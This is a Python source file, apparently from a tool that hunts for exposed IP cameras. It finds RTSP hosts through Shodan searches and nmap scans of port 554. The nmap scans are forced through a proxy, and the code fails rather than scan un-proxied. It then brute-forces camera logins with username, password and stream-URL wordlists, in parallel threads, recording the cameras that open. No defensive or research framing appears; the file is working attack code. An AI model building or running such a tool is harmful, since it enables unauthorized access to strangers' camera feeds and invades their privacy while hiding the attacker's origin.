import itertools
import logging
import random
from abc import ABC, abstractmethod
from concurrent.futures import ThreadPoolExecutor
from typing import Dict

import nmap
import shodan
from pydantic import BaseModel, ConfigDict, Field
from shodan import APIError

from models.camera import Camera
from models.managers import CameraRepository
from scanners.config import CheckersConfig, NmapConfig, ShodanConfig
from scanners.proxy import TwoCaptchaProxy
from scanners.rtsp_probe import RtspProbe, RtspTarget

__version__ = "0.1.0"

# nmap --proxies only relays through HTTP/SOCKS4 (see `nmap --help`); a socks5
# proxy is rejected, so NmapTask must be given one of these.
_NMAP_PROXY_SCHEMES = ("http", "socks4", "socks4a")


class _Location(BaseModel):
    model_config = ConfigDict(extra="ignore")

    city: str | None = None
    country_code: str | None = None
    country_name: str | None = None
    region_code: str | None = None


class ShodanBanner(BaseModel):
    """The subset of a Shodan search banner this scanner cares about."""

    model_config = ConfigDict(extra="ignore")

    ip_str: str
    port: int
    location: _Location = Field(default_factory=_Location)


class Task(ABC):
    """Base task: holds a validated config model and a camera repository."""

    def __init__(self, config: BaseModel, repository: CameraRepository = None):
        if config is None:
            raise ValueError("Config is required")
        self.config = config
        self.repository = repository or CameraRepository()

    @abstractmethod
    def run(self) -> None:
        raise NotImplementedError("You must implement the run method")


class NmapTask(Task):
    """Scan a network range with nmap and store the hosts that answer on RTSP."""

    def __init__(
        self,
        config: NmapConfig,
        proxy: TwoCaptchaProxy,
        repository: CameraRepository = None,
    ):
        super().__init__(config, repository)
        self.proxy = proxy
        self.scanner = nmap.PortScanner()

    def run(self) -> None:
        logging.info(f"Starting nmap scanning on {self.config.ip_range}")

        hosts = self._scan(self.config.ip_range)
        logging.info(f"Found {len(hosts)} hosts using nmap scan")

        for host, host_data in hosts.items():
            for port in host_data["tcp"]:
                self.repository.insert_camera(Camera(ip=host, port=port))
                logging.debug(f"Added on db {host}:{port}")
        logging.info("Executors: finished nmap scan")

    def _scan(self, target: str) -> Dict:
        proxy_url = self.proxy.url()
        scheme = proxy_url.split("://", 1)[0].lower()
        if scheme not in _NMAP_PROXY_SCHEMES:
            raise ValueError(
                f"nmap --proxies supports {_NMAP_PROXY_SCHEMES}, got {scheme!r}; "
                "give NmapTask an http proxy (TwoCaptchaSettings(protocol='http')). "
                "Failing loud so the scan never silently runs un-proxied."
            )
        arguments = f"-p 554 -sV --proxies {proxy_url}"
        if self.config.parallelism > 0:
            arguments += f" -T4 --min-parallelism {self.config.parallelism}"
        response = self.scanner.scan(hosts=target, arguments=arguments)
        return response.get("scan")


class ShodanTask(Task):
    """Search Shodan for cameras and store the new ones in the database."""

    config: ShodanConfig

    def run(self) -> None:
        api = shodan.Shodan(self.config.api_key)
        query = self.config.query
        logging.info("Updating database")

        cams_added = 0
        try:
            for raw in api.search_cursor(query):
                banner = ShodanBanner(**raw)
                if self.repository.find(banner.ip_str, banner.port):
                    continue
                self.repository.insert_camera(
                    Camera(
                        ip=banner.ip_str,
                        port=banner.port,
                        city=banner.location.city,
                        country_code=banner.location.country_code,
                        country_name=banner.location.country_name,
                        region_code=banner.location.region_code,
                    )
                )
                logging.debug(f"{banner.ip_str}:{banner.port} added")
                cams_added += 1
            logging.info(f"{cams_added} cameras added")
        except APIError as e:
            # only the Shodan boundary is caught here; a bug (bad banner shape)
            # must surface, not be swallowed by a broad except
            logging.error(f"Shodan api error: {e}")


class CheckTask(Task):
    """Try RTSP credential combinations against inactive cameras in the database."""

    def __init__(
        self,
        config: CheckersConfig,
        repository: CameraRepository = None,
        probe: RtspProbe = None,
    ):
        super().__init__(config, repository)
        self.probe = probe or RtspProbe()

    def run(self) -> None:
        logging.info("Starting check task")
        users = self._read_lines(self.config.wordlist_users)
        passwords = self._read_lines(self.config.wordlist_passwords)
        rtsp_urls = self._read_lines(self.config.wordlist_rtsp_urls)

        if self.config.randomize:
            random.shuffle(users)
            random.shuffle(passwords)
            random.shuffle(rtsp_urls)

        cameras = self.repository.get_random_inactive()
        logging.debug(f"Testing {len(cameras)} cameras")

        combinations = itertools.product(rtsp_urls, users, passwords, cameras)
        targets = (
            RtspTarget(
                host=camera.ip,
                port=camera.port,
                user=user,
                password=password,
                url_template=url_template,
            )
            for url_template, user, password, camera in combinations
        )
        # concurrency workers probe in parallel (I/O-bound); results are consumed
        # here on one thread so set_active stays serial. map preserves order and
        # pulls the target generator lazily, so all combos are never materialised.
        with ThreadPoolExecutor(max_workers=self.config.concurrency) as pool:
            for found in pool.map(self.probe.probe, targets):
                if found:
                    self.repository.set_active(found)
        logging.info("Executors: finished testing cameras")

    @staticmethod
    def _read_lines(path):
        with open(path, "r") as f:
            return f.read().splitlines()
